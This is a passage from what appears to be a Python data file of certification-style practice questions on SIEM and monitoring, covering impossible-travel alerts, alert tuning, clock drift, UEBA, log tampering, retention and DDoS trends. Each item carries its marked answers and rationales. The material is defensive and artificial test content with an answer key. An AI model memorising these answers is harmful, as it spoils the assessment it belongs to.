             "rationale": "Incorrect. None of the named targets are described as domain controllers, and AD "
                          "replication uses machine accounts with specific replication traffic, not a single "
                          "service account logging into unrelated file/database/finance servers."},
            {"id": "c", "text": "A scheduled SQL Server maintenance job that only ever touches its designated "
                                 "database server", "correct": False,
             "rationale": "Incorrect. The scenario states the account has never authenticated to any of these "
                          "four servers before, and touching four unrelated servers including HR-DB01 and "
                          "FINANCE01 is inconsistent with a scoped maintenance job."},
            {"id": "d", "text": "A password expiration notification being broadcast to multiple servers",
             "correct": False,
             "rationale": "Incorrect. Password expiration notices do not generate Logon Type 3 authentication "
                          "success events across multiple servers."},
        ],
        "explanation": (
            "SIEM-aggregated Windows Security logs let analysts see the same account authenticating to multiple "
            "hosts it has never touched before, in rapid succession, from a single source — the defining "
            "evidence pattern of lateral movement using compromised credentials."
        ),
    },
    # ---------------------------------------------------------------
    # SIEM & monitoring (14) — domain 4, objective 4.4
    # ---------------------------------------------------------------
    {
        "id": "tlog-017",
        "domain": 4,
        "objective": "4.4",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "SIEM & monitoring",
        "stem": (
            "A SIEM correlation rule generates the following alert:\n"
            "Rule: Impossible Travel\n"
            "User: rwilliams\n"
            "Event 1: Successful login from New York, US (203.0.113.40) at 09:02:00 UTC\n"
            "Event 2: Successful login from Bucharest, Romania (185.220.101.33) at 09:14:00 UTC\n"
            "Calculated minimum travel time between locations: 9.5 hours\n"
            "What does this correlated alert MOST likely indicate?"
        ),
        "options": [
            {"id": "a", "text": "The rwilliams account credentials have likely been compromised and are being "
                                 "used simultaneously from two geographically distant locations within an "
                                 "impossible timeframe", "correct": True,
             "rationale": "Correct. Two successful logins from locations that would require 9.5 hours of travel, "
                          "occurring only 12 minutes apart, is physically impossible and strongly indicates "
                          "account compromise."},
            {"id": "b", "text": "The user is legitimately using a VPN that changes their apparent location "
                                 "between login attempts", "correct": False,
             "rationale": "Incorrect. A 12-minute gap is far too short even for a VPN reconnection, and the "
                          "SIEM's impossible-travel calculation already accounts for physical distance versus "
                          "elapsed time, which cannot be reconciled by VPN use alone."},
            {"id": "c", "text": "This is a duplicate alert caused by SIEM log ingestion lag and should be "
                                 "suppressed", "correct": False,
             "rationale": "Incorrect. Dismissing a correctly correlated impossible-travel alert as a technical "
                          "artifact without investigation ignores a strong indicator of account compromise."},
            {"id": "d", "text": "The alert indicates normal load-balanced authentication traffic being logged "
                                 "from two data centers", "correct": False,
             "rationale": "Incorrect. Load-balancer/data-center logging would not show two distinct successful "
                          "logins tied to real-world geolocations 9.5 hours of travel apart but only 12 minutes "
                          "apart in the log."},
        ],
        "explanation": (
            "SIEM impossible-travel correlation combines geolocation and timestamp data across authentication "
            "events to flag logins that could not both be legitimate given the physical distance and time "
            "elapsed — a strong, automated indicator of credential compromise."
        ),
    },
    {
        "id": "tlog-018",
        "domain": 4,
        "objective": "4.4",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "SIEM & monitoring",
        "stem": (
            "A SIEM generates hundreds of 'Possible Port Scan Detected' alerts every Tuesday at 02:00 AM, all "
            "sourced from 10.0.0.5. Investigation confirms 10.0.0.5 is the organization's authorized internal "
            "vulnerability scanner, and the scans are part of the approved weekly maintenance window. What is "
            "the BEST way to handle this recurring alert?"
        ),
        "options": [
            {"id": "a", "text": "Create an allowlist/suppression rule that excludes the scanner's known IP and "
                                 "scheduled window from this specific alert, while still logging the activity "
                                 "for audit purposes", "correct": True,
             "rationale": "Correct. Tuning out a confirmed, authorized, recurring false positive without losing "
                          "visibility (activity is still logged) is the correct SIEM maintenance practice."},
            {"id": "b", "text": "Permanently disable the port scan detection rule across the entire "
                                 "environment", "correct": False,
             "rationale": "Incorrect. Disabling the rule entirely removes detection capability for genuine "
                          "unauthorized port scans from any other source, which is overly broad."},
            {"id": "c", "text": "Ignore the alerts manually each week without making any configuration change",
             "correct": False,
             "rationale": "Incorrect. Manual dismissal wastes analyst time repeatedly and risks an analyst "
                          "eventually missing a genuine alert buried among the noise; a tuning rule is the "
                          "scalable fix."},
            {"id": "d", "text": "Block the vulnerability scanner's IP address at the firewall", "correct": False,
             "rationale": "Incorrect. Blocking the organization's own authorized scanner would break the "
                          "approved vulnerability management program entirely."},
        ],
        "explanation": (
            "SIEM tuning through scoped allowlist/suppression rules eliminates confirmed, recurring false "
            "positives from known, authorized sources while preserving both audit logging and full detection "
            "coverage for everything else — the balance manual dismissal or blanket rule disabling cannot achieve."
        ),
    },
    {
        "id": "tlog-019",
        "domain": 4,
        "objective": "4.4",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "SIEM & monitoring",
        "stem": (
            "During an incident investigation, an analyst notices that timestamps for the same authentication "
            "event differ across three log sources: the SIEM (10:15:02), the domain controller's local Security "
            "log (10:12:47), and the firewall (10:15:00). The SIEM and firewall are synchronized to the same "
            "NTP source; the domain controller is not. What is the MOST likely impact of this discrepancy, and "
            "how should it be corrected?"
        ),
        "options": [
            {"id": "a", "text": "The domain controller's events cannot be reliably sequenced against other log "
                                 "sources during correlation; all log sources should be configured to sync to "
                                 "the same authoritative NTP source", "correct": True,
             "rationale": "Correct. A roughly 2-minute clock drift on the domain controller, unsynced from the "
                          "NTP source the SIEM and firewall share, undermines accurate event sequencing during "
                          "correlation; the fix is syncing every source to one authoritative time reference."},
            {"id": "b", "text": "The discrepancy is expected and requires no correction, since all logging "
                                 "systems naturally drift and analysts should mentally adjust timestamps",
             "correct": False,
             "rationale": "Incorrect. Relying on manual mental adjustment during a time-sensitive investigation "
                          "is unreliable and error-prone; the correct fix is synchronizing all sources to a "
                          "common time reference."},
            {"id": "c", "text": "The domain controller's clock is correct and the SIEM/firewall should be "
                                 "changed to match it instead", "correct": False,
             "rationale": "Incorrect. The scenario does not establish which clock is authoritative; the real fix "
                          "is ensuring all sources use the SAME trusted NTP source, not arbitrarily picking the "
                          "outlier as ground truth."},
            {"id": "d", "text": "Time discrepancies only affect log retention policies, not event correlation "
                                 "accuracy", "correct": False,
             "rationale": "Incorrect. Time discrepancies directly impair correlation and sequencing of related "
                          "events across log sources, which is central to accurate incident timeline "
                          "reconstruction, not merely a retention concern."},
        ],
        "explanation": (
            "Accurate multi-source log correlation in a SIEM depends on consistent time synchronization (NTP) "
            "across every contributing system. An unsynchronized source introduces timeline errors that can "
            "distort the sequence of events during an investigation."
        ),
    },
    {
        "id": "tlog-020",
        "domain": 4,
        "objective": "4.4",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "SIEM & monitoring",
        "stem": (
            "A SIEM's user and entity behavior analytics (UEBA) dashboard shows the following for the account "
            "'kpatel':\n"
            "Baseline (90-day average): 15-20 file accesses/day, business hours only, from one workstation\n"
            "Today: 1,240 file accesses between 01:00-03:00 AM, from a workstation kpatel has never used\n"
            "Risk score: 92/100 (Critical)\n"
            "What does this UEBA output BEST support?"
        ),
        "options": [
            {"id": "a", "text": "A significant deviation from kpatel's established behavioral baseline — "
                                 "abnormal volume, abnormal hours, and an unfamiliar device — strongly suggests "
                                 "account compromise or insider misuse", "correct": True,
             "rationale": "Correct. A roughly 60-80x spike in file access volume, occurring outside business "
                          "hours, from a device never previously used, is exactly the kind of deviation UEBA is "
                          "designed to flag as high risk."},
            {"id": "b", "text": "The baseline itself is inaccurate and should be discarded since one day of "
                                 "activity contradicts it", "correct": False,
             "rationale": "Incorrect. A single extreme outlier that deviates this dramatically from a 90-day "
                          "baseline is exactly the signal UEBA is designed to surface, not evidence the baseline "
                          "is wrong."},
            {"id": "c", "text": "kpatel is simply working overtime to catch up on a backlog of files",
             "correct": False,
             "rationale": "Incorrect. A 60-80x increase in volume, at hours never previously used, from an "
                          "unfamiliar device, goes well beyond a plausible explanation of routine overtime work."},
            {"id": "d", "text": "The risk score is irrelevant because UEBA tools only monitor network traffic, "
                                 "not file access", "correct": False,
             "rationale": "Incorrect. UEBA platforms specifically baseline and score entity behavior including "
                          "file access patterns, login times, and device usage — this is core UEBA functionality."},
        ],
        "explanation": (
            "UEBA dashboards compare current activity against a learned per-entity baseline. Large deviations in "
            "volume, timing, and device combined into a critical risk score are the exact pattern UEBA exists to "
            "detect for potential account compromise or insider threats."
        ),
    },
    {
        "id": "tlog-021",
        "domain": 4,
        "objective": "4.4",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "SIEM & monitoring",
        "stem": (
            "A SOC's SIEM generates approximately 4,000 alerts per day. Analysts report that critical alerts "
            "are frequently missed because they are buried among thousands of low-fidelity informational "
            "alerts, and staff are beginning to reflexively dismiss notifications. Which action would MOST "
            "directly address this problem?"
        ),
        "options": [
            {"id": "a", "text": "Implement alert correlation, severity-based prioritization, and suppression "
                                 "of low-value rules to reduce noise so high-fidelity, high-severity alerts are "
                                 "surfaced distinctly", "correct": True,
             "rationale": "Correct. This directly targets alert fatigue by improving the signal-to-noise ratio "
                          "through correlation and tuning, ensuring critical alerts stand out instead of being "
                          "buried."},
            {"id": "b", "text": "Hire additional analysts to manually triage every alert individually without "
                                 "changing the SIEM configuration", "correct": False,
             "rationale": "Incorrect. Adding headcount without addressing the underlying noise/tuning problem is "
                          "a costly, non-scalable workaround that does not fix the root cause of alert fatigue."},
            {"id": "c", "text": "Disable logging from the noisiest data sources entirely to reduce alert "
                                 "volume", "correct": False,
             "rationale": "Incorrect. Wholesale disabling of log sources sacrifices visibility and could "
                          "eliminate legitimate detection coverage, rather than tuning the alerts generated from "
                          "that data."},
            {"id": "d", "text": "Extend the SIEM's log retention period from 90 days to 365 days",
             "correct": False,
             "rationale": "Incorrect. Retention period affects how long historical data is stored; it has no "
                          "effect on the daily volume or quality of alerts being generated now."},
        ],
        "explanation": (
            "Alert fatigue is best addressed by improving alert quality through correlation, prioritization, and "
            "suppression of low-value rules — not by adding staff, cutting visibility, or extending unrelated "
            "retention settings."
        ),
    },
    {
        "id": "tlog-022",
        "domain": 4,
        "objective": "4.4",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "SIEM & monitoring",
        "stem": (
            "A SIEM dashboard shows a complete gap in log ingestion from a critical domain controller between "
            "02:00 and 04:30, while all other monitored systems continued reporting normally during that "
            "window. When log flow resumed at 04:30, the domain controller's local event log showed the "
            "Windows Event Log service had been stopped and restarted, and several new local administrator "
            "accounts had been created during the gap. What does this MOST likely indicate?"
        ),
        "options": [
            {"id": "a", "text": "An attacker with administrative access deliberately disabled event logging to "
                                 "operate without detection while creating persistence accounts, then "
                                 "re-enabled logging to avoid raising further suspicion", "correct": True,
             "rationale": "Correct. A stopped-and-restarted Event Log service exactly bracketing unauthorized "
                          "administrator account creation is a classic anti-forensics/log-tampering technique."},
            {"id": "b", "text": "A routine Windows Update reboot temporarily interrupted the logging agent",
             "correct": False,
             "rationale": "Incorrect. A routine update reboot would not selectively stop only the Event Log "
                          "service while the OS remained functional enough to create new administrator "
                          "accounts, nor would it coincide with new account creation."},
            {"id": "c", "text": "The SIEM's log collector experienced a temporary network outage unrelated to "
                                 "the domain controller itself", "correct": False,
             "rationale": "Incorrect. The domain controller's own local event log confirms the Event Log service "
                          "was stopped and restarted on the host itself, not merely a transport/collector issue, "
                          "and this coincides directly with new account creation."},
            {"id": "d", "text": "This is expected behavior during a scheduled log archive rotation",
             "correct": False,
             "rationale": "Incorrect. Log archive rotation does not require stopping the Event Log service or "
                          "align with the creation of new local administrator accounts."},
        ],
        "explanation": (
            "A gap in a SIEM dashboard's log ingestion timeline, corroborated by the host's own local log showing "
            "the logging service was stopped, is a strong indicator of deliberate log tampering to conceal "
            "malicious activity such as unauthorized account creation."
        ),
    },
    {
        "id": "tlog-023",
        "domain": 4,
        "objective": "4.4",
        "type": "multiple_response",
        "difficulty": "hard",
        "study_topic": "SIEM & monitoring",
        "stem": (
            "A SIEM correlation rule elevates an alert to 'Critical' severity after combining four data points "
            "into a single incident timeline for host FIN-WKS12:\n"
            "1) Antivirus: No malware signatures matched (informational)\n"
            "2) EDR: PowerShell spawned from an Excel macro with an obfuscated, base64-encoded command (high)\n"
            "3) Firewall: Outbound connection immediately following to a newly registered domain with no prior "
            "traffic history (high)\n"
            "4) Asset inventory: Host is assigned to the Finance department (informational)\n"
            "Select TWO data points that were the PRIMARY drivers justifying the escalation to Critical severity."
        ),
        "options": [
            {"id": "a", "text": "EDR: PowerShell spawned from an Excel macro with an obfuscated, base64-encoded "
                                 "command", "correct": True,
             "rationale": "Correct. This is a high-fidelity behavioral indicator of malicious macro execution "
                          "and directly drives the severity escalation."},
            {"id": "b", "text": "Firewall: Outbound connection to a newly registered domain with no prior "
                                 "traffic history immediately following the suspicious process activity",
             "correct": True,
             "rationale": "Correct. Correlating the malicious process execution with an immediate connection to "
                          "a suspicious, newly registered domain is a strong C2 indicator that legitimately "
                          "elevates severity."},
            {"id": "c", "text": "Antivirus: No malware signatures matched", "correct": False,
             "rationale": "Incorrect. A clean AV scan is informational/negative evidence and does not drive "
                          "escalation; it simply reflects that signature-based detection did not catch anything, "
                          "which is common with obfuscated/fileless techniques."},
            {"id": "d", "text": "Asset inventory: Host is assigned to the Finance department", "correct": False,
             "rationale": "Incorrect. Department assignment is contextual metadata useful for prioritizing "
                          "response impact, but it is not behavioral evidence of malicious activity and does not "
                          "itself justify the severity escalation."},
        ],
        "explanation": (
            "SIEM correlation rules weigh behavioral, high-fidelity evidence (malicious process execution, "
            "suspicious network activity) far more heavily than informational/contextual data points like a "
            "clean AV scan or department assignment when determining severity."
        ),
    },
    {
        "id": "tlog-024",
        "domain": 4,
        "objective": "4.4",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "SIEM & monitoring",
        "stem": (
            "An analyst investigating a breach discovered in July needs firewall logs from the previous "
            "February to determine the attacker's initial entry point. The SIEM returns no results for that "
            "period. Review shows the organization's log retention policy is configured for 90 days, and raw "
            "logs are purged after that window. What is the MOST appropriate long-term corrective action?"
        ),
        "options": [
            {"id": "a", "text": "Extend the log retention policy to align with incident response and "
                                 "compliance requirements, and archive older logs to lower-cost storage instead "
                                 "of purging them", "correct": True,
             "rationale": "Correct. The root cause is a retention window shorter than what investigations/"
                          "compliance require; extending retention and archiving to lower-cost storage prevents "
                          "this exact gap from recurring."},
            {"id": "b", "text": "Immediately increase the SIEM's real-time alert threshold sensitivity",
             "correct": False,
             "rationale": "Incorrect. Alert sensitivity tuning affects how alerts are generated going forward; it "
                          "has no effect on the fact that historical logs from February were already purged."},
            {"id": "c", "text": "Request that the firewall vendor recover the deleted logs from their servers",
             "correct": False,
             "rationale": "Incorrect. Firewall vendors do not retain a copy of a customer's operational logs; "
                          "those logs exist only where the customer chose to store/retain them."},
            {"id": "d", "text": "Conclude the investigation is complete since the initial entry point cannot "
                                 "be determined", "correct": False,
             "rationale": "Incorrect. Prematurely closing an investigation due to a data gap does not address "
                          "root cause and leaves the true entry vector unknown without exhausting other avenues "
                          "or fixing the recurring gap."},
        ],
        "explanation": (
            "A retention window shorter than the organization's investigative or compliance needs directly "
            "causes evidence gaps during breach investigations. The corrective action is extending retention "
            "(with cost-effective archiving), not tuning unrelated alert settings or expecting vendor recovery."
        ),
    },
    {
        "id": "tlog-025",
        "domain": 4,
        "objective": "4.4",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "SIEM & monitoring",
        "stem": (
            "A SOC ingests logs from a Windows Security event source (fields: EventID, TargetUserName, "
            "IpAddress), a Linux auth.log source (free-text syslog lines), and a cloud IAM provider (JSON with "
            "'actorEmail' and 'sourceIPAddress' fields). Analysts currently cannot run a single correlation "
            "search across all three to find every event tied to a given IP address. Which SIEM capability "
            "MOST directly solves this?"
        ),
        "options": [
            {"id": "a", "text": "Log normalization/parsing into a common field schema (e.g., mapping "
                                 "IpAddress, the syslog source IP, and sourceIPAddress all to a single "
                                 "normalized 'src_ip' field)", "correct": True,
             "rationale": "Correct. Normalization is exactly the capability that reconciles differently-formatted "
                          "fields from disparate sources into a consistent schema, enabling a single unified "
                          "correlation search."},
            {"id": "b", "text": "Increasing the SIEM's log storage capacity", "correct": False,
             "rationale": "Incorrect. Storage capacity affects how much data can be retained, not whether "
                          "differently structured fields from different sources can be searched together."},
            {"id": "c", "text": "Enabling full-disk encryption on the SIEM's storage volumes", "correct": False,
             "rationale": "Incorrect. Encryption at rest protects data confidentiality; it has no effect on the "
                          "ability to correlate differently-named fields across log sources."},
            {"id": "d", "text": "Configuring role-based access control for SIEM dashboard users",
             "correct": False,
             "rationale": "Incorrect. RBAC controls who can view dashboards/data; it does not address the "
                          "technical problem of unifying disparate field names/formats for correlation."},
        ],
        "explanation": (
            "Log normalization maps differently-named and differently-formatted fields from heterogeneous "
            "sources (Windows, Linux syslog, cloud JSON) into a common schema, which is what enables a single "
            "cross-source correlation search — a core SIEM capability distinct from storage, encryption, or RBAC."
        ),
    },
    {
        "id": "tlog-026",
        "domain": 4,
        "objective": "4.4",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "SIEM & monitoring",
        "stem": (
            "A SIEM dashboard displaying aggregate inbound connection attempts per minute to a public-facing "
            "web server shows:\n"
            "08:00-08:59: ~150 connections/min (baseline)\n"
            "09:00-09:05: spikes to over 48,000 connections/min from more than 3,000 distinct source IPs across "
            "dozens of countries, all targeting the same URL\n"
            "09:06: the web server becomes unresponsive\n"
            "Which type of attack does this dashboard trend MOST clearly indicate?"
        ),
        "options": [
            {"id": "a", "text": "A distributed denial-of-service (DDoS) attack — a massive, sudden spike in "
                                 "connection volume from thousands of distinct, geographically dispersed "
                                 "sources overwhelming the server", "correct": True,
             "rationale": "Correct. The dashboard shows a 300x volume spike from over 3,000 distinct global "
                          "source IPs within minutes, immediately followed by service unresponsiveness — the "
                          "defining signature of a DDoS attack."},
            {"id": "b", "text": "A single-source brute-force password attack", "correct": False,
             "rationale": "Incorrect. Brute force targets authentication with repeated attempts from typically "
                          "one or a small number of sources against login endpoints, not 3,000+ distinct global "
                          "IPs flooding a single URL."},
            {"id": "c", "text": "A slow, low-and-slow reconnaissance scan", "correct": False,
             "rationale": "Incorrect. The described spike is the opposite of 'slow and low'; it is a massive, "
                          "near-instantaneous volumetric surge."},
            {"id": "d", "text": "A planned load test conducted by the organization's QA team", "correct": False,
             "rationale": "Incorrect. The sudden, unannounced spike from over 3,000 distinct global source IPs "
                          "immediately followed by service unresponsiveness is not consistent with a controlled, "
                          "internally sourced QA load test."},
        ],
        "explanation": (
            "SIEM aggregate dashboards reveal traffic trends that individual log lines cannot show as clearly. A "
            "massive, sudden, globally-distributed spike in connection volume culminating in service outage is "
            "the classic DDoS trend signature."
        ),
    },
    {
        "id": "tlog-027",
        "domain": 4,
        "objective": "4.4",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "SIEM & monitoring",
        "stem": (
            "A SIEM alert reads: 'Confidence: Low (35/100) — Single failed login attempt for account tjones "
            "from a known corporate IP range, occurring during business hours, followed immediately by a "
            "successful login from the same IP.' What is the MOST appropriate analyst action?"
        ),
        "options": [
            {"id": "a", "text": "Close the alert as a benign false positive (e.g., a mistyped password), since "
                                 "the pattern matches normal user behavior, and document the reasoning",
             "correct": True,
             "rationale": "Correct. The low confidence score, expected corporate-IP source, single failed "
                          "attempt, business-hours timing, and immediate successful correction all align with an "
                          "ordinary typo rather than an attack."},
            {"id": "b", "text": "Immediately isolate tjones's workstation and disable the account without "
                                 "further review", "correct": False,
             "rationale": "Incorrect. This response is disproportionate to a low-confidence, single-failed-"
                          "attempt alert from an expected corporate IP during business hours, and would cause "
                          "unnecessary business disruption."},
            {"id": "c", "text": "Escalate to the incident response team as a confirmed brute-force compromise",
             "correct": False,
             "rationale": "Incorrect. A single failed attempt does not constitute a brute-force pattern, and the "
                          "low confidence score, corporate-IP source, and business-hours timing do not support "
                          "escalating this to a confirmed compromise."},
            {"id": "d", "text": "Permanently block the corporate IP range at the perimeter firewall",
             "correct": False,
             "rationale": "Incorrect. Blocking the organization's own known corporate IP range would disrupt "
                          "legitimate business traffic and is a wildly disproportionate response to one "
                          "low-confidence alert."},
        ],
        "explanation": (
            "SIEM confidence scoring and contextual fields (source IP reputation, timing, attempt count) should "
            "drive proportionate triage decisions. A low-confidence alert whose details all align with ordinary "
            "user error warrants documented closure, not escalation or drastic containment action."
        ),
    },
    {
        "id": "tlog-028",
        "domain": 4,
        "objective": "4.4",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "SIEM & monitoring",
        "stem": (
            "A SIEM alert shows a successful VPN login for the account dthompson at 14:32 from an IP "
            "geolocated to Lagos, Nigeria. dthompson's physical badge access log shows the same employee "
            "badged into the corporate headquarters building in Chicago at 14:15 and has not badged out. What "
            "does correlating these two data points MOST strongly suggest?"
        ),
        "options": [
            {"id": "a", "text": "The dthompson credentials are being used by someone other than the "
                                 "legitimate employee, since the employee is physically present in Chicago "
                                 "while a VPN login originates from Nigeria at nearly the same time",
             "correct": True,
             "rationale": "Correct. The badge log directly contradicts the claimed remote login location — the "
                          "employee cannot be physically in Chicago and simultaneously logging in from Nigeria — "
                          "indicating credential compromise/misuse."},
            {"id": "b", "text": "The badge system clock is running fast and the timestamps simply do not "
                                 "align", "correct": False,
             "rationale": "Incorrect. Assuming a clock error without investigation dismisses a strong, "
                          "corroborated compromise indicator; the scenario gives no evidence of clock drift, "
                          "only a physically impossible combination of events."},
            {"id": "c", "text": "dthompson is using a company-approved VPN split-tunnel configuration that "
                                 "reroutes traffic through Nigeria", "correct": False,
             "rationale": "Incorrect. A VPN configuration reroutes network traffic path, but the login event's "
                          "geolocated source IP combined with simultaneous physical badge presence in Chicago is "
                          "a credential-use conflict, not something explainable by client-side VPN routing choices."},
            {"id": "d", "text": "This is expected because badge logs and VPN logs are not related systems and "
                                 "should never be correlated", "correct": False,
             "rationale": "Incorrect. Correlating physical and logical access logs is a standard and valuable "
                          "SOC practice specifically for catching scenarios like this one."},
        ],
        "explanation": (
            "Correlating physical access (badge) logs with logical access (VPN/authentication) logs can reveal "
            "credential misuse that neither log alone would expose — here, simultaneous physical presence and a "
            "geographically distant login are mutually exclusive, indicating compromise."
        ),
    },
    {
        "id": "tlog-029",
        "domain": 4,
        "objective": "4.4",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "SIEM & monitoring",
        "stem": (
            "A SOC manager reviews the SIEM's monthly performance dashboard:\n"
            "Mean Time to Detect (MTTD): increased from 12 minutes to 96 minutes over the last quarter\n"
            "Mean Time to Respond (MTTR): increased from 40 minutes to 5 hours over the same period\n"
            "Alert volume: increased 300% after onboarding two new log sources without corresponding "
            "correlation rule tuning\n"
            "What is the MOST likely cause of the degraded MTTD/MTTR trend?"
        ),
        "options": [
            {"id": "a", "text": "The untuned surge in alert volume from newly onboarded log sources is "
                                 "overwhelming analysts, delaying both detection and response to genuine "
                                 "incidents", "correct": True,
             "rationale": "Correct. This directly ties the stated causal factor (300% alert volume increase "
                          "without tuning) to the resulting MTTD/MTTR degradation shown on the dashboard."},
            {"id": "b", "text": "The organization's incident response plan was recently rewritten and is now "
                                 "less effective", "correct": False,
             "rationale": "Incorrect. No evidence in the dashboard data points to a plan rewrite; the data "
                          "explicitly attributes the change to alert volume from new, untuned log sources."},
            {"id": "c", "text": "MTTD and MTTR naturally increase every quarter regardless of operational "
                                 "changes", "correct": False,
             "rationale": "Incorrect. MTTD/MTTR are operational metrics that respond to real changes in tooling, "
                          "staffing, and alert quality; they do not inherently trend upward without a cause, and "
                          "this scenario identifies a specific one."},
            {"id": "d", "text": "The new log sources are providing lower-quality data, so the correlation "
                                 "rules require no changes", "correct": False,
             "rationale": "Incorrect. This is self-contradictory and does not follow from the data; the fix for "
                          "alert-volume-driven delays is precisely tuning the new correlation rules, not leaving "
                          "them unchanged."},
        ],
        "explanation": (
            "SIEM performance dashboards (MTTD/MTTR trends) should be read alongside operational context, such "
            "as alert volume changes, to identify root causes. An untuned surge in alert volume overwhelming "
            "analysts directly explains degraded detection and response times."
        ),
    },
    {
        "id": "tlog-030",
        "domain": 4,
        "objective": "4.4",
        "type": "multiple_choice",
        "difficulty": "hard",
        "study_topic": "SIEM & monitoring",
        "stem": (
            "An analyst is asked to reconstruct the full attack chain for an incident using the SIEM. Which "
            "sequence of correlated log evidence would MOST completely support the narrative: initial phishing "
            "delivery, execution, and command-and-control?"
        ),
        "options": [
            {"id": "a", "text": "Email gateway log showing a malicious attachment delivered to a user, "
                                 "followed by an EDR log showing the attachment's macro spawning PowerShell, "
                                 "followed by a firewall/DNS log showing a subsequent connection to a "
                                 "known-bad external domain", "correct": True,
             "rationale": "Correct. This sequence spans delivery, execution, and C2, correlating three distinct "
                          "log sources into a coherent, complete attack chain narrative."},
            {"id": "b", "text": "Only the firewall log showing a single outbound connection to an external IP, "
                                 "with no other corroborating sources", "correct": False,
             "rationale": "Incorrect. A single outbound connection log entry in isolation, without delivery or "
                          "execution evidence, cannot establish the full attack chain narrative requested."},
            {"id": "c", "text": "Only the badge access log showing the affected employee entered the building "
                                 "that day", "correct": False,
             "rationale": "Incorrect. Physical presence data provides no information about phishing delivery, "
                          "malicious execution, or C2 communication."},
            {"id": "d", "text": "Only the printer log showing the user printed a document around the time of "
                                 "the incident", "correct": False,
             "rationale": "Incorrect. Print activity logs have no bearing on reconstructing a phishing-to-C2 "
                          "attack chain."},
        ],
        "explanation": (
            "Reconstructing a full attack chain requires correlating multiple, complementary log sources — "
            "email gateway (delivery), endpoint/EDR (execution), and network/DNS (C2) — rather than relying on "
            "any single source or an unrelated log type."
        ),
    },
]
